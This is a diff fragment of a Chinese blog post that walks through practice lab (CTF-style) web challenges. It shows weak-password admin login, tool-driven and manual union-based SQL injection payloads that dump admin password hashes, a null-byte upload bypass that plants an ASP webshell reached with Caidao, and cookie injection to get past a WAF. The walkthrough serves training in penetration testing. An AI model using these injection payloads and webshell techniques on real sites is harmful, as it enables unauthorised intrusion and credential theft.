-![img](file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps12.png)
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8742.png" class title="This is an test image">![img](file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps12.png)
 
 <p>点击第一行：</p>
-![img](file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps14.png)
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8743.png" class title="This is an test image">![img](file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps14.png)
 
 <p>输入网站后台的地址：<a href="http://192.168.111.134/shop2/admin/login1.asp">http://192.168.111.134/shop/admin/login.asp </a>我们来到后台登录页面（这里找到后台比较简单，可以试一下几个可能的地址，就不需要扫描了）</p>
-![img](file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps16.png)
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8744.png" class title="This is an test image">![img](file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps16.png)
 
 <p>先来试试弱密码：账号：admin 密码：admin</p>
-![img](file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps18.png)
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8745.png" class title="This is an test image">![img](file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps18.png)
 
 <p>填好后点击“管理登录”，发现成功进入后台管理页面：</p>
-![img](file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps20.jpg)
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8746.png" class title="This is an test image">![img](file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps20.jpg)
 
 
 
@@ -499,158 +564,158 @@
 <p>首先进入后台先要找到后台登录页面，使用工具扫描没有结果，但发现了网站的后台：</p>
 <p><a href="http://192.168.111.134/shop2/admin/login1.asp">http://192.168.111.134/shop2/admin/login1.asp</a></p>
 <p>跳转到网页后台登录页面：</p>
-![img](file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps22.png)
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8747.png" class title="This is an test image">![img](file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps22.png)
 
 <p>试一试之前试过的弱密码，失败</p>
 <p>接下来进行<strong>sql注入</strong></p>
 <p>打开阿D注入工具</p>
-![img](file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps26.jpg)
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8748.png" class title="This is an test image">![img](file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps26.jpg)
 
 <p>将注入链接里面的IP地址改成我现在的地址，点击检测</p>
-![img](file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps28.jpg)
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8749.png" class title="This is an test image">![img](file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps28.jpg)
 
 <p>点击检测标段，再点击admin</p>
-![img](file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps30.jpg)
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8750.png" class title="This is an test image">![img](file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps30.jpg)
 
 <p>点击检测字段，再把password和admin勾选上</p>
-![img](file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps32.jpg)
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8751.png" class title="This is an test image">![img](file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps32.jpg)
 
 <p>点击检测内容</p>
-![img](file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps34.jpg)
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8752.png" class title="This is an test image">![img](file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps34.jpg)
 
 <p>结果出现两组账号密码，我们任选其中一组就行</p>
-![img](file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps36.jpg)
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8753.png" class title="This is an test image">![img](file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps36.jpg)
 
 <p>在这里，我选择了上面一种，双击，出现账号和密码</p>
-![img](file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps38.png)
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8754.png" class title="This is an test image">![img](file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps38.png)
 
 <p>我们发现密码好像被MD5加密过了，解密得</p>
-![img](file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps38.png)![img](file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps40.jpg)
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8755.png" class title="This is an test image">![img](file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps38.png)![img](file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps40.jpg)
 
 <p>用获取的账号和密码进行登录</p>
-![img](file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps38.png)![img](file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps42.png)
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8756.png" class title="This is an test image">![img](file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps38.png)![img](file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps42.png)
 
 <p>成功登录</p>
-![img](file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps38.png)![img](file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps44.jpg)
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8757.png" class title="This is an test image">![img](file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps38.png)![img](file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps44.jpg)
 
 <p>上传木马</p>
-![img](file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps38.png) 
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8758.png" class title="This is an test image">![img](file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps38.png) 
 
 <p>文件上传成功</p>
-![img](file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps38.png) 
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8759.png" class title="This is an test image">![img](file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps38.png) 
 
-![img](file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps38.png) 
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8760.png" class title="This is an test image">![img](file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps38.png) 
 
 <p>在保存信息的路径下添加888.asp.jpg，在16进制数中找到asp后的.进行00截断。将2e改为00</p>
-![img](file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps38.png) 
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8761.png" class title="This is an test image">![img](file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps38.png) 
 
 <p>输入保存路径+888.asp打开网页显示木马添加成功</p>
-![img](file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps38.png) 
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8762.png" class title="This is an test image">![img](file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps38.png) 
 
 <p>打开菜刀，将木马路径输入进去</p>
-![img](file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps38.png) 
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8763.png" class title="This is an test image">![img](file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps38.png) 
 
 <p>双击网址，打开即可看到任意盘下的文件并进行更改</p>
-![img](file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps38.png)
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8764.png" class title="This is an test image">![img](file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps38.png)
 
 
 
 
 
-<h3 id="尤里的复仇-sql注入"><a href="#尤里的复仇-sql注入" class="headerlink" title="尤里的复仇-sql注入"></a>尤里的复仇-sql注入</h3>![img](file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps38.png) 
+<h3 id="尤里的复仇-sql注入"><a href="#尤里的复仇-sql注入" class="headerlink" title="尤里的复仇-sql注入"></a>尤里的复仇-sql注入</h3><img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8765.png" class title="This is an test image">![img](file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps38.png) 
 
 <p><strong>判断是否存在SQL注入漏洞</strong></p>
 <p>1.构造 ?id&#x3D;1 and 1&#x3D;1 ，回车观察页面是否正常</p>
-![img](file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps38.png) 
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8766.png" class title="This is an test image">![img](file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps38.png) 
 
 <p>页面返回正常，可知 and 这个参数注入进去被当成SQL语句执行了。</p>
 <p>2.构造 and 1&#x3D;2</p>
-![img](file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps38.png) 
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8767.png" class title="This is an test image">![img](file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps38.png) 
 
 <p>页面不正常,初步判断这里可能存在一个注入漏洞</p>
 <p><strong>判断字段数</strong></p>
 <p>构造 ?id&#x3D;1 and 1&#x3D;1 order by 1 回车</p>
-![img](file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps38.png) 
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8768.png" class title="This is an test image">![img](file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps38.png) 
 
 <p>页面返回正常，进行第二步，构造 ?id&#x3D;1 and 1&#x3D;1 order by 2 回车</p>
-![img](file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps38.png) 
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8769.png" class title="This is an test image">![img](file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps38.png) 
 
 <p>页面显示正常，进行第三步，构造 ?id&#x3D;1 and 1&#x3D;1 order by 3 回车</p>
-![img](file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps38.png) 
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8770.png" class title="This is an test image">![img](file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps38.png) 
 
 <p>页面返回 错误，判断字段数为 2（判断字符数只有两个）</p>
 <p><strong>判断回显点</strong></p>
 <p>构造 ?id&#x3D;1 and 1&#x3D;2 union select 1,2 回车</p>
-![img](file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps38.png) 
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8771.png" class title="This is an test image">![img](file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps38.png) 
 
 <p>页面出现了 2 ，说明我们可以在数字 2 处显示我们想要的内容</p>
 <p><strong>查询相关内容</strong></p>
 <p>查询当前数据库名：构造 ?id&#x3D;1 and 1&#x3D;2 union select 1,database() 回车</p>
-![img](file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps38.png) 
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8772.png" class title="This is an test image">![img](file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps38.png) 
 
 <p>页面回显maoshe</p>
 <p>查询当前数据库版本：构造 ?id&#x3D;1 and 1&#x3D;2 union select 1,version() 回车</p>
-![img](file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps38.png) 
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8773.png" class title="This is an test image">![img](file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps38.png) 
 
 <p>回显版本号为5.5.53</p>
 <p>查询当前数据库 表名：构造 ?id&#x3D;1 and 1&#x3D;2 union select 1,table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1 回车</p>
-![img](file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps38.png) 
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8774.png" class title="This is an test image">![img](file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps38.png) 
 
 <p>页面回显admin</p>
 <p>绝大数情况下，管理员的账号密码都在admin表里。</p>
 <p>查询字段名：构造 ?id&#x3D;1 and 1&#x3D;2 union select 1,column_name from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’admin’ limit 0,1 回车</p>
-![img](file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps38.png) 
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8775.png" class title="This is an test image">![img](file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps38.png) 
 
 <p>回显字段名为id</p>
 <p>构造 ?id&#x3D;1 and 1&#x3D;2 union select 1,column_name from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’admin’ limit 1,1 回车</p>
-![img](file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps38.png) 
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8776.png" class title="This is an test image">![img](file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps38.png) 
 
 <p>构造 ?id&#x3D;1 and 1&#x3D;2 union select 1,column_name from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’admin’ limit 2,1 回车</p>
-![img](file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps38.png) 
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8777.png" class title="This is an test image">![img](file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps38.png) 
 
 <p>回显password</p>
 <p>构造语句输出账号密码： ?id&#x3D;1 and 1&#x3D;2 union select 1,password from admin limit 0,1 回车</p>
-![img](file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps38.png) 
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8778.png" class title="This is an test image">![img](file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps38.png) 
 
 <p>回显hellohack 得到管理员账号和密码为：hellokack</p>
 <p>得到flag</p>
-<h3 id="尤里的复仇-信息收集1"><a href="#尤里的复仇-信息收集1" class="headerlink" title="尤里的复仇-信息收集1"></a>尤里的复仇-信息收集1</h3>![img](file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps38.png) 
+<h3 id="尤里的复仇-信息收集1"><a href="#尤里的复仇-信息收集1" class="headerlink" title="尤里的复仇-信息收集1"></a>尤里的复仇-信息收集1</h3><img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8779.png" class title="This is an test image">![img](file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps38.png) 
 
 <p>用御剑进行扫描，flag在二级目录里</p>
-![img](file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps38.png) 
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8780.png" class title="This is an test image">![img](file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps38.png) 
 
-![img](file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps38.png) 
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8781.png" class title="This is an test image">![img](file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps38.png) 
 
 <p>点击链接，得到flag</p>
-![img](file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps38.png) 
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8782.png" class title="This is an test image">![img](file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps38.png) 
 
 
 
 
 
-<h3 id="尤里的复仇-绕过WAF"><a href="#尤里的复仇-绕过WAF" class="headerlink" title="尤里的复仇-绕过WAF"></a>尤里的复仇-绕过WAF</h3>![img](file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps38.png) 
+<h3 id="尤里的复仇-绕过WAF"><a href="#尤里的复仇-绕过WAF" class="headerlink" title="尤里的复仇-绕过WAF"></a>尤里的复仇-绕过WAF</h3><img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8783.png" class title="This is an test image">![img](file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps38.png) 
 
 <p>随便点击一个新闻。在id&#x3D;171后面加一个引号’，测试一下是否有SQL注入</p>
 <p>有弹框了，提示过滤了很多关键字。下一步考虑如何绕过这些关键字</p>
 <p>因为网页做了waf过滤防护，这里考虑用cookie注入，可以进行绕过</p>
 <p>这里使用一个小工具进行注入</p>
 <p>打开这款插件直接在value处填写注入参数即可然后按上面的键开始（value中的值需要注意的是空格用+表示）</p>
-![img](file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps38.png) 
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8784.png" class title="This is an test image">![img](file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps38.png) 
 
 <p>出现账号和密码</p>
-![img](file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps38.png) 
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8785.png" class title="This is an test image">![img](file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps38.png) 
 
 <p>将密码md5解密</p>
-![img](file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps38.png) 
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8786.png" class title="This is an test image">![img](file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps38.png) 
 
 <p>用御剑进行扫描，获得后台地址：</p>
-![img](file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps38.png)  
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8787.png" class title="This is an test image">![img](file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps38.png)  
 
 <p>输入之前获得的用户名和密码</p>
-![img](file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps38.png)  
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8788.png" class title="This is an test image">![img](file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps38.png)  
 
 <p>成功拿到flag</p>
-![img](file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps38.png)  
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8789.png" class title="This is an test image">![img](file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps38.png)  
 ]]></content>
       <tags>
         <tag>Web-渗透测试</tag>
